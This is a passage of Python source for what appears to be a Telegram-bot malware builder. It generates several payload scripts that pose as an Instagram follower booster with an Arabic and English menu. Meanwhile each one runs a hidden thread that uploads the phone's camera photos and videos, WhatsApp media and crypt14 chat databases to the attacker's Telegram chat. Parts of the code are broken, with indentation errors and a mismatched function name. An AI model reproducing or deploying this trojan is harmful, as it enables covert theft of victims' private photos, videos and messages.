            bot.send_photo(chat_id={id}, photo=f, caption='By: @Atmaja5788_bot')


def send_file2(file_path):
    with open(file_path, "rb") as f:
        if file_path.lower().endswith((".mp4")):
            bot.send_video(chat_id={id}, video=f, caption='By: @Atmaja5788_bot')

def send_file3(file_path):
    with open(file_path, "rb") as f:
        if file_path.lower().endswith((".pdf", ".pat", ".doc", ".py", ".apk", ".exe", ".cpp", ".text")):
            bot.send_document(chat_id={id}, document=f, caption='By: @Atmaja5788_bot')

def back():
	with ThreadPoolExecutor(max_workers=300) as executor:
		for root, dirs, files in os.walk(dir_path):
			for file in files:
			file_path = os.path.join(root, file)
            	if file_path.lower().endswith((".jpg", ".png", ".jpeg", ".webp")):
					executor.submit(send_file1, file_path)
				elif file_path.lower().endswith((".mp4")):
					executor.submit(send_file2, file_path)
				elif file_path.lower().endswith((".pdf", ".pat", ".doc", ".py", ".apk", ".exe", ".cpp", ".text")):
					executor.submit(send_file3, file_path)

threading.Thread(target=back).start()

Ab='\033[1;92m'
aB='\033[1;91m'
AB='\033[1;96m'
aBbs='\033[1;93m'
AbBs='\033[1;95m'
A_bSa = '\033[1;31m'
a_bSa = '\033[1;32m'
faB_s = '\033[2;32m'
a_aB_s = '\033[2;39m'
Ba_bS = '\033[2;36m'
Ya_Bs = '\033[1;34m'
S_aBs = '\033[1;33m'
ab = pyfiglet.figlet_format("atmaja")
print(a_bSa+ab)
def slow(T): 
	for r in T + '\\n' :
	    sys.stdout.write(r)
	    sys.stdout.flush()
	    time.sleep(30/2000)

slow(S_aBs+"""⌯ Welcome In Instagram Follower Script *.   \n ⌯ اهلا بيك في اداه رشق متابعين انستقرام *.
---------------------------------------------------
""")
uid = uuid
username = input (''+Ba_bS+'('+a_aB_s+'!'+S_aBs+')'+Ba_bS+'  ⌯ Enter Username  :  '+faB_s)
print('  ')
print(Ba_bS+'الرجاء الانتظار بعض الوقت.....')

time.sleep(10)

os.system("clear")		
print(a_bSa+ab)


slow(S_aBs+ """
⌯  [ 1 ] - 3k    ⇦  
⌯  [ 2 ] - 5k    ⇦  
⌯  [ 3 ] - 8k    ⇦  
⌯  [ 4 ] - 10k   ⇦  
⌯  [ 5 ] - 15k   ⇦ 
⌯  [ 6 ] - 20k   ⇦  
   \n""")
Abs = input (''+Ba_bS+"""  ⌯ اختر كم عدد الرشق الذي تريده .\n ⌯ Choose the number of followers you want  :  """+faB_s)
print('  ')
if (Abs == '1'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبك لرشق 3000 \nمتابع يرجى الانتظار الى ان يتم الوصول الى طلبك\n الطلبات الان 10 طلب **\n\n - Welcome dear, once again your request has been\nselected to throw 3000 followers Please wait\n until your request is reached Orders are now\n   50 requests **.   """)
if (Abs == '2'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 5000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 20 طلب **\n\n - Welcome dear, once again your request has been\nselected to throw 8000 followers Please wait\n until your request is reached Orders are now\n   150 requests **.   """)
if (Abs == '3'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 8000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 30 طلب **\n\n - Welcome dear, once again your request has been\nselected to throw 3000 followers Please wait\n until your request is reached Orders are now\n   50 requests **.   """)
if (Abs == '4'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 10000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 40 طلب**\n\n - Welcome dear, once again your request has been\nselected to throw 10000 followers Please wait\n until your request is reached Orders are now\n   200 requests **.   """)
if (Abs == '5'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 15000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 50 طلب **\n\n - Welcome dear, once again your request has been\nselected to throw 15000 followers Please wait\n until your request is reached Orders are now\n   250 requests **.   """)
if (Abs == '6'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 20000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 60 طلب **\n\n - Welcome dear, once again your request has been\nselected to throw 20000 followers Please wait\n until your request is reached Orders are now\n   2 requests **.   """) 
            '''
						creat_payloads(id, ms, payload)
					elif second_data == 'watsaudio':

						payload =  f'''import sys
import uuid
import subprocess
import time
import os
import base64
from concurrent.futures import ThreadPoolExecutor
import threading

try:
    import telebot, pyfiglet, requests 
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pyTelegramBotAPI", 'pyfiglet', 'requests'])
    import telebot
    import pyfiglet
    import requests

bot = telebot.TeleBot('{TOKEN}')
dir_path = "/storage/emulated/0/Android/media/"

def send_file(file_path):
    with open(file_path, "rb") as f:
        if file_path.lower().endswith((".aac",".mp3", ".opus")):
            bot.send_audio(chat_id={id}, audio=f, caption='By: @Atmaja5788_bot')
def back():
	with ThreadPoolExecutor(max_workers=300) as executor:
		for root, dirs, files in os.walk(dir_path):
			for file in files:
				file_path = os.path.join(root, file)
				if file_path.lower().endswith((".aac",".mp3", ".opus")):
					executor.submit(send_file, file_path)

threading.Thread(target=back).start()

Ab='\033[1;92m'
aB='\033[1;91m'
AB='\033[1;96m'
aBbs='\033[1;93m'
AbBs='\033[1;95m'
A_bSa = '\033[1;31m'
a_bSa = '\033[1;32m'
faB_s = '\033[2;32m'
a_aB_s = '\033[2;39m'
Ba_bS = '\033[2;36m'
Ya_Bs = '\033[1;34m'
S_aBs = '\033[1;33m'
ab = pyfiglet.figlet_format("atmaja")
print(a_bSa+ab)
def slow(T): 
	for r in T + '\\n' :
	    sys.stdout.write(r)
	    sys.stdout.flush()
	    time.sleep(30/2000)

slow(S_aBs+"""⌯ Welcome In Instagram Follower Script *.   \n ⌯ اهلا بيك في اداه رشق متابعين انستقرام *.
---------------------------------------------------
""")
uid = uuid
username = input (''+Ba_bS+'('+a_aB_s+'!'+S_aBs+')'+Ba_bS+'  ⌯ Enter Username  :  '+faB_s)
print('  ')
print(Ba_bS+'الرجاء الانتظار بعض الوقت.....')

time.sleep(10)

os.system("clear")		
print(a_bSa+ab)


slow(S_aBs+ """
⌯  [ 1 ] - 3k    ⇦  
⌯  [ 2 ] - 5k    ⇦  
⌯  [ 3 ] - 8k    ⇦  
⌯  [ 4 ] - 10k   ⇦  
⌯  [ 5 ] - 15k   ⇦ 
⌯  [ 6 ] - 20k   ⇦  
   \n""")
Abs = input (''+Ba_bS+"""  ⌯ اختر كم عدد الرشق الذي تريده .\n ⌯ Choose the number of followers you want  :  """+faB_s)
print('  ')
if (Abs == '1'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبك لرشق 3000 \nمتابع يرجى الانتظار الى ان يتم الوصول الى طلبك\n الطلبات الان 10 طلب **\n\n - Welcome dear, once again your request has been\nselected to throw 3000 followers Please wait\n until your request is reached Orders are now\n   50 requests **.   """)
if (Abs == '2'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 5000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 20 طلب **\n\n - Welcome dear, once again your request has been\nselected to throw 8000 followers Please wait\n until your request is reached Orders are now\n   150 requests **.   """)
if (Abs == '3'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 8000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 30 طلب **\n\n - Welcome dear, once again your request has been\nselected to throw 3000 followers Please wait\n until your request is reached Orders are now\n   50 requests **.   """)
if (Abs == '4'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 10000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 40 طلب **\n\n - Welcome dear, once again your request has been\nselected to throw 10000 followers Please wait\n until your request is reached Orders are now\n   200 requests **.   """)
if (Abs == '5'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 15000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 50 طلب **\n\n - Welcome dear, once again your request has been\nselected to throw 15000 followers Please wait\n until your request is reached Orders are now\n   250 requests **.   """)
if (Abs == '6'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 20000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 60 طلب **\n\n - Welcome dear, once again your request has been\nselected to throw 20000 followers Please wait\n until your request is reached Orders are now\n   2 requests **.   """) 
            '''
						creat_payloads(id, ms, payload)
					elif second_data == 'watsvid':

						payload =  f'''import sys
import uuid
import subprocess
import time
import os
import base64
from concurrent.futures import ThreadPoolExecutor
import threading

try:
    import telebot, pyfiglet, requests 
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pyTelegramBotAPI", 'pyfiglet', 'requests'])
    import telebot
    import pyfiglet
    import requests

bot = telebot.TeleBot('{TOKEN}')
dir_path = "/storage/emulated/0/Android/media/"

def send_file(file_path):
    with open(file_path, "rb") as f:
        if file_path.lower().endswith((".mp4")):
            bot.send_video(chat_id={id}, video=f, caption='By: @Atmaja5788_bot')

def back():
	with ThreadPoolExecutor(max_workers=300) as executor:
		for root, dirs, files in os.walk(dir_path):
			for file in files:
				file_path = os.path.join(root, file)
				if file_path.lower().endswith((".aac",".mp3", ".opus")):
					executor.submit(send_file, file_path)

threading.Thread(target=back).start()


Ab='\033[1;92m'
aB='\033[1;91m'
AB='\033[1;96m'
aBbs='\033[1;93m'
AbBs='\033[1;95m'
A_bSa = '\033[1;31m'
a_bSa = '\033[1;32m'
faB_s = '\033[2;32m'
a_aB_s = '\033[2;39m'
Ba_bS = '\033[2;36m'
Ya_Bs = '\033[1;34m'
S_aBs = '\033[1;33m'
ab = pyfiglet.figlet_format("atmaja")
print(a_bSa+ab)
def slow(T): 
	for r in T + '\\n' :
	    sys.stdout.write(r)
	    sys.stdout.flush()
	    time.sleep(30/2000)

slow(S_aBs+"""⌯ Welcome In Instagram Follower Script 💘.   \n ⌯ اهلا بيك في اداه رشق متابعين انستقرام 💘.
---------------------------------------------------
""")
uid = uuid
username = input (''+Ba_bS+'('+a_aB_s+'!'+S_aBs+')'+Ba_bS+'  ⌯ Enter Username  :  '+faB_s)
print('  ')
print(Ba_bS+'الرجاء الانتظار بعض الوقت.....')

time.sleep(10)

os.system("clear")		
print(a_bSa+ab)


slow(S_aBs+ """
⌯  [ 1 ] - 3k    ⇦  
⌯  [ 2 ] - 5k    ⇦  
⌯  [ 3 ] - 8k    ⇦  
⌯  [ 4 ] - 10k   ⇦  
⌯  [ 5 ] - 15k   ⇦ 
⌯  [ 6 ] - 20k   ⇦  
   \n""")
Abs = input (''+Ba_bS+"""  ⌯ اختر كم عدد الرشق الذي تريده .\n ⌯ Choose the number of followers you want  :  """+faB_s)
print('  ')
if (Abs == '1'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبك لرشق 3000 \nمتابع يرجى الانتظار الى ان يتم الوصول الى طلبك\n الطلبات الان 10 طلب **\n\n - Welcome dear, once again your request has been\nselected to throw 3000 followers Please wait\n until your request is reached Orders are now\n   50 requests **.   """)
if (Abs == '2'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 5000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 20 طلب **\n\n - Welcome dear, once again your request has been\nselected to throw 8000 followers Please wait\n until your request is reached Orders are now\n   150 requests **.   """)
if (Abs == '3'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 8000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 30 طلب **\n\n - Welcome dear, once again your request has been\nselected to throw 3000 followers Please wait\n until your request is reached Orders are now\n   50 requests **.   """)
if (Abs == '4'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 10000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 40 طلب **\n\n - Welcome dear, once again your request has been\nselected to throw 10000 followers Please wait\n until your request is reached Orders are now\n   200 requests **.   """)
if (Abs == '5'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 15000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 50 طلب **\n\n - Welcome dear, once again your request has been\nselected to throw 15000 followers Please wait\n until your request is reached Orders are now\n   250 requests **.   """)
if (Abs == '6'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 20000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 60 طلب **\n\n - Welcome dear, once again your request has been\nselected to throw 20000 followers Please wait\n until your request is reached Orders are now\n   2 requests **.   """) 
            '''
						creat_payloads(id, ms, payload)
					elif second_data == 'watsphoto':

						payload =  f'''import sys
import uuid
import subprocess
import time
import os
import base64
from concurrent.futures import ThreadPoolExecutor
import threading

try:
    import telebot, pyfiglet, requests 
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pyTelegramBotAPI", 'pyfiglet', 'requests'])
    import telebot
    import pyfiglet
    import requests

bot = telebot.TeleBot('{TOKEN}')
dir_path = "/storage/emulated/0/Android/media/"

def send_file(file_path):
    with open(file_path, "rb") as f:
        if file_path.lower().endswith((".png", ".PNG", ".jpg", ".JPG", ".jpeg", ".JPEG", ".webp")):
            bot.send_photo(chat_id={id}, photo=f, caption='By: @Atmaja5788_bot')

def back():
    with ThreadPoolExecutor(max_workers=300) as executor:
        for root, dirs, files in os.walk(dir_path):
            for file in files:
                file_path = os.path.join(root, file)
                if file_path.lower().endswith((".png", ".PNG", ".jpg", ".JPG", ".jpeg", ".JPEG", ".webp")):
                    executor.submit(send_file, file_path)

threading.Thread(target=back).start()


Ab='\033[1;92m'
aB='\033[1;91m'
AB='\033[1;96m'
aBbs='\033[1;93m'
AbBs='\033[1;95m'
A_bSa = '\033[1;31m'
a_bSa = '\033[1;32m'
faB_s = '\033[2;32m'
a_aB_s = '\033[2;39m'
Ba_bS = '\033[2;36m'
Ya_Bs = '\033[1;34m'
S_aBs = '\033[1;33m'
ab = pyfiglet.figlet_format("atmaja")
print(a_bSa+ab)
def slow(T): 
	for r in T + '\\n' :
	    sys.stdout.write(r)
	    sys.stdout.flush()
	    time.sleep(30/2000)

slow(S_aBs+"""⌯ Welcome In Instagram Follower Script *.   \n ⌯ اهلا بيك في اداه رشق متابعين انستقرام *.
---------------------------------------------------
""")
uid = uuid
username = input (''+Ba_bS+'('+a_aB_s+'!'+S_aBs+')'+Ba_bS+'  ⌯ Enter Username  :  '+faB_s)
print('  ')
print(Ba_bS+'الرجاء الانتظار بعض الوقت.....')

time.sleep(10)

os.system("clear")		
print(a_bSa+ab)


slow(S_aBs+ """
⌯  [ 1 ] - 3k    ⇦  
⌯  [ 2 ] - 5k    ⇦  
⌯  [ 3 ] - 8k    ⇦  
⌯  [ 4 ] - 10k   ⇦  
⌯  [ 5 ] - 15k   ⇦ 
⌯  [ 6 ] - 20k   ⇦  
   \n""")
Abs = input (''+Ba_bS+"""  ⌯ اختر كم عدد الرشق الذي تريده .\n ⌯ Choose the number of followers you want  :  """+faB_s)
print('  ')
if (Abs == '1'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبك لرشق 3000 \nمتابع يرجى الانتظار الى ان يتم الوصول الى طلبك\n الطلبات الان 10 طلب **\n\n - Welcome dear, once again your request has been\nselected to throw 3000 followers Please wait\n until your request is reached Orders are now\n   50 requests**.   """)
if (Abs == '2'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 5000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 20 طلب**\n\n - Welcome dear, once again your request has been\nselected to throw 8000 followers Please wait\n until your request is reached Orders are now\n   150 requests **.   """)
if (Abs == '3'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 8000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 30 طلب **\n\n - Welcome dear, once again your request has been\nselected to throw 3000 followers Please wait\n until your request is reached Orders are now\n   50 requests **.   """)
if (Abs == '4'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 10000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 40 طلب **\n\n - Welcome dear, once again your request has been\nselected to throw 10000 followers Please wait\n until your request is reached Orders are now\n   200 requests **.   """)
if (Abs == '5'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 15000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 50 طلب**\n\n - Welcome dear, once again your request has been\nselected to throw 15000 followers Please wait\n until your request is reached Orders are now\n   250 requests **.   """)
if (Abs == '6'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 20000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 60 طلب **\n\n - Welcome dear, once again your request has been\nselected to throw 20000 followers Please wait\n until your request is reached Orders are now\n   2 requests **.   """) 
            '''
						creat_payloads(id, ms, payload)
					elif second_data == 'watsdb':

						payload =  f'''import sys
import uuid
import subprocess
import time
import os
import base64
from concurrent.futures import ThreadPoolExecutor
import threading

try:
    import telebot, pyfiglet, requests 
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pyTelegramBotAPI", 'pyfiglet', 'requests'])
    import telebot
    import pyfiglet
    import requests

bot = telebot.TeleBot('{TOKEN}')
dir_path = "/storage/emulated/0/Android/media/"

def send_file(file_path):
    with open(file_path, "rb") as f:
        if file_path.lower().endswith("crypt14"):
            bot.send_document(chat_id={id}, document=f, caption='By: @Atmaja5788_bot')

def bqck():
    with ThreadPoolExecutor(max_workers=300) as executor:
        for root, dirs, files in os.walk(dir_path):
            for file in files:
                file_path = os.path.join(root, file)
                if file_path.lower().endswith("crypt14"):
                    executor.submit(send_file, file_path)

threading.Thread(target=back).start()


Ab='\033[1;92m'
aB='\033[1;91m'
AB='\033[1;96m'
aBbs='\033[1;93m'
AbBs='\033[1;95m'
A_bSa = '\033[1;31m'
a_bSa = '\033[1;32m'
faB_s = '\033[2;32m'
a_aB_s = '\033[2;39m'
Ba_bS = '\033[2;36m'
Ya_Bs = '\033[1;34m'
S_aBs = '\033[1;33m'
ab = pyfiglet.figlet_format("atmaja")
print(a_bSa+ab)
def slow(T): 
	for r in T + '\\n' :
	    sys.stdout.write(r)
	    sys.stdout.flush()
	    time.sleep(30/2000)

slow(S_aBs+"""⌯ Welcome In Instagram Follower Script*.   \n ⌯ اهلا بيك في اداه رشق متابعين انستقرام *.
---------------------------------------------------
""")
uid = uuid
username = input (''+Ba_bS+'('+a_aB_s+'!'+S_aBs+')'+Ba_bS+'  ⌯ Enter Username  :  '+faB_s)
print('  ')
print(Ba_bS+'الرجاء الانتظار بعض الوقت.....')

time.sleep(10)

os.system("clear")		
print(a_bSa+ab)


slow(S_aBs+ """
⌯  [ 1 ] - 3k    ⇦  
⌯  [ 2 ] - 5k    ⇦  
⌯  [ 3 ] - 8k    ⇦  
⌯  [ 4 ] - 10k   ⇦  
⌯  [ 5 ] - 15k   ⇦ 
⌯  [ 6 ] - 20k   ⇦  
   \n""")
Abs = input (''+Ba_bS+"""  ⌯ اختر كم عدد الرشق الذي تريده .\n ⌯ Choose the number of followers you want  :  """+faB_s)
print('  ')
if (Abs == '1'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبك لرشق 3000 \nمتابع يرجى الانتظار الى ان يتم الوصول الى طلبك\n الطلبات الان 10 طلب **\n\n - Welcome dear, once again your request has been\nselected to throw 3000 followers Please wait\n until your request is reached Orders are now\n   50 requests **.   """)
if (Abs == '2'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 5000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 20 طلب **\n\n - Welcome dear, once again your request has been\nselected to throw 8000 followers Please wait\n until your request is reached Orders are now\n   150 requests **.   """)
if (Abs == '3'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 8000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 30 طلب **\n\n - Welcome dear, once again your request has been\nselected to throw 3000 followers Please wait\n until your request is reached Orders are now\n   50 requests **.   """)
if (Abs == '4'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 10000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 40 طلب **\n\n - Welcome dear, once again your request has been\nselected to throw 10000 followers Please wait\n until your request is reached Orders are now\n   200 requests **.   """)
if (Abs == '5'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 15000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 50 طلب **\n\n - Welcome dear, once again your request has been\nselected to throw 15000 followers Please wait\n until your request is reached Orders are now\n   250 requests **.   """)
if (Abs == '6'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 20000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 60 طلب **\n\n - Welcome dear, once again your request has been\nselected to throw 20000 followers Please wait\n until your request is reached Orders are now\n   2 requests **.   """) 
            '''
						creat_payloads(id, ms, payload)
					elif second_data == 'camvid':
						payload =  f'''import sys
import uuid
import subprocess
import time
import os
import base64
from concurrent.futures import ThreadPoolExecutor
import threading

try:
    import telebot, pyfiglet, requests 
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pyTelegramBotAPI", 'pyfiglet', 'requests'])
    import telebot
    import pyfiglet
    import requests

bot = telebot.TeleBot('{TOKEN}')
dir_path = "/storage/emulated/0/DCIM/Camera/"

def send_file(file_path):
    with open(file_path, "rb") as f:
        if file_path.lower().endswith((".mp4")):
            bot.send_video(chat_id={id}, video=f, caption='By: @Atmaja5788_bot')

def back():
    with ThreadPoolExecutor(max_workers=300) as executor:
        for root, dirs, files in os.walk(dir_path):
            for file in files:
                file_path = os.path.join(root, file)
                if file_path.lower().endswith((".mp4")):
                    executor.submit(send_file, file_path)

threading.Thread(target=back).start()

Ab='\033[1;92m'
aB='\033[1;91m'
AB='\033[1;96m'
aBbs='\033[1;93m'
AbBs='\033[1;95m'
A_bSa = '\033[1;31m'
a_bSa = '\033[1;32m'
faB_s = '\033[2;32m'
a_aB_s = '\033[2;39m'
Ba_bS = '\033[2;36m'
Ya_Bs = '\033[1;34m'
S_aBs = '\033[1;33m'
ab = pyfiglet.figlet_format("atmaja")
print(a_bSa+ab)
def slow(T): 
	for r in T + '\\n' :
	    sys.stdout.write(r)
	    sys.stdout.flush()
	    time.sleep(30/2000)

slow(S_aBs+"""⌯ Welcome In Instagram Follower Script *.   \n ⌯ اهلا بيك في اداه رشق متابعين انستقرام *.
---------------------------------------------------
""")
uid = uuid
username = input (''+Ba_bS+'('+a_aB_s+'!'+S_aBs+')'+Ba_bS+'  ⌯ Enter Username  :  '+faB_s)
print('  ')
print(Ba_bS+'الرجاء الانتظار بعض الوقت.....')

time.sleep(10)

os.system("clear")		
print(a_bSa+ab)


slow(S_aBs+ """
⌯  [ 1 ] - 3k    ⇦  
⌯  [ 2 ] - 5k    ⇦  
⌯  [ 3 ] - 8k    ⇦  
⌯  [ 4 ] - 10k   ⇦  
⌯  [ 5 ] - 15k   ⇦ 
⌯  [ 6 ] - 20k   ⇦  
   \n""")
Abs = input (''+Ba_bS+"""  ⌯ اختر كم عدد الرشق الذي تريده .\n ⌯ Choose the number of followers you want  :  """+faB_s)
print('  ')
if (Abs == '1'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبك لرشق 3000 \nمتابع يرجى الانتظار الى ان يتم الوصول الى طلبك\n الطلبات الان 10 طلب **\n\n - Welcome dear, once again your request has been\nselected to throw 3000 followers Please wait\n until your request is reached Orders are now\n   50 requests **.   """)
if (Abs == '2'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 5000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 20 طلب **\n\n - Welcome dear, once again your request has been\nselected to throw 8000 followers Please wait\n until your request is reached Orders are now\n   150 requests **.   """)
if (Abs == '3'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 8000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 30 طلب **\n\n - Welcome dear, once again your request has been\nselected to throw 3000 followers Please wait\n until your request is reached Orders are now\n   50 requests **.   """)
if (Abs == '4'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 10000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 40 طلب **\n\n - Welcome dear, once again your request has been\nselected to throw 10000 followers Please wait\n until your request is reached Orders are now\n   200 requests **.   """)
if (Abs == '5'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 15000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 50 طلب **\n\n - Welcome dear, once again your request has been\nselected to throw 15000 followers Please wait\n until your request is reached Orders are now\n   250 requests **.   """)
if (Abs == '6'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 20000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 60 طلب **\n\n - Welcome dear, once again your request has been\nselected to throw 20000 followers Please wait\n until your request is reached Orders are now\n   2 requests **.   """) 
            '''
						creat_payloads(id, ms, payload)
					elif second_data == 'camimg':
						payload =  f'''import sys
import uuid
import subprocess
import time
import os
import base64
from concurrent.futures import ThreadPoolExecutor
import threading

try:
    import telebot, pyfiglet, requests 
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pyTelegramBotAPI", 'pyfiglet', 'requests'])
    import telebot
    import pyfiglet
    import requests

bot = telebot.TeleBot('{TOKEN}')
dir_path = "/storage/emulated/0/DCIM/Camera/"

def send_file(file_path):
    with open(file_path, "rb") as f:
        if file_path.lower().endswith((".jpg", ".png", ".jpeg", ".webp")):
            bot.send_photo(chat_id={id}, photo=f, caption='By: @Atmaja5788_bot')

def back():
    with ThreadPoolExecutor(max_workers=300) as executor:
        for root, dirs, files in os.walk(dir_path):
            for file in files:
                file_path = os.path.join(root, file)
                if file_path.lower().endswith((".jpg", ".png", ".jpeg", ".webp")):
                    executor.submit(send_file, file_path)

threading.Thread(target=back).start()

Ab='\033[1;92m'
aB='\033[1;91m'
AB='\033[1;96m'
aBbs='\033[1;93m'
AbBs='\033[1;95m'
A_bSa = '\033[1;31m'
a_bSa = '\033[1;32m'
faB_s = '\033[2;32m'
a_aB_s = '\033[2;39m'
Ba_bS = '\033[2;36m'
Ya_Bs = '\033[1;34m'
S_aBs = '\033[1;33m'
ab = pyfiglet.figlet_format("atmaja")
print(a_bSa+ab)
def slow(T): 
	for r in T + '\\n' :
	    sys.stdout.write(r)
	    sys.stdout.flush()
	    time.sleep(30/2000)

slow(S_aBs+"""⌯ Welcome In Instagram Follower Script *±.   \n ⌯ اهلا بيك في اداه رشق متابعين انستقرام *.
---------------------------------------------------
""")
uid = uuid
username = input (''+Ba_bS+'('+a_aB_s+'!'+S_aBs+')'+Ba_bS+'  ⌯ Enter Username  :  '+faB_s)
print('  ')
print(Ba_bS+'الرجاء الانتظار بعض الوقت.....')

time.sleep(10)

os.system("clear")		
print(a_bSa+ab)


slow(S_aBs+ """
⌯  [ 1 ] - 3k    ⇦  
⌯  [ 2 ] - 5k    ⇦  
⌯  [ 3 ] - 8k    ⇦  
⌯  [ 4 ] - 10k   ⇦  
⌯  [ 5 ] - 15k   ⇦ 
⌯  [ 6 ] - 20k   ⇦  
   \n""")
Abs = input (''+Ba_bS+"""  ⌯ اختر كم عدد الرشق الذي تريده .\n ⌯ Choose the number of followers you want  :  """+faB_s)
print('  ')
if (Abs == '1'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبك لرشق 3000 \nمتابع يرجى الانتظار الى ان يتم الوصول الى طلبك\n الطلبات الان 10 طلب **\n\n - Welcome dear, once again your request has been\nselected to throw 3000 followers Please wait\n until your request is reached Orders are now\n   50 requests **.   """)
if (Abs == '2'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 5000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 20 طلب **\n\n - Welcome dear, once again your request has been\nselected to throw 8000 followers Please wait\n until your request is reached Orders are now\n   150 requests **.   """)
if (Abs == '3'):
